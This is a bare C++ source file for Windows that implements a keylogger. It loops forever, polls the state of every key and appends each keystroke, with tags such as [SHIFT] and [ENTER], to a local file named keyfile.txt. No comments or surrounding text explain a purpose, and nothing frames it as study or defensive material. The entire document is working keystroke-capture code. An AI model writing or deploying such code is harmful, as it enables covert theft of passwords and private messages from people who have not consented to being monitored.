#include <iostream>
#include <windows.h>
#include <conio.h>
#include <fstream>

using namespace std;

int keyLog(char key, fstream& fileText){

  fileText.open("keyfile.txt", ios::app | ios::in | ios::out);
  if(fileText){
    if(GetAsyncKeyState(VK_ESCAPE)){
      fileText << "[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_SHIFT)){
      fileText << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_RETURN)){
      fileText << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL)){
      fileText << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU)){
      fileText << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE)){
      fileText << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB)){
      fileText << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
      fileText << "[BACKSPACE]";
    }
    else{
      fileText << key;
    }
  }

  fileText.close();

  return 0;
}

int main(){

  char press;
  int ascii_value;

  fstream afile;

  afile.open("keyfile.txt", ios::in | ios::out);
  afile.close();

  while(true){
     for(int i=8; i<256; i++){
       if(GetAsyncKeyState(i) == -32767){
         keyLog(i, afile);
       }
     }

  }
  return 0;
}
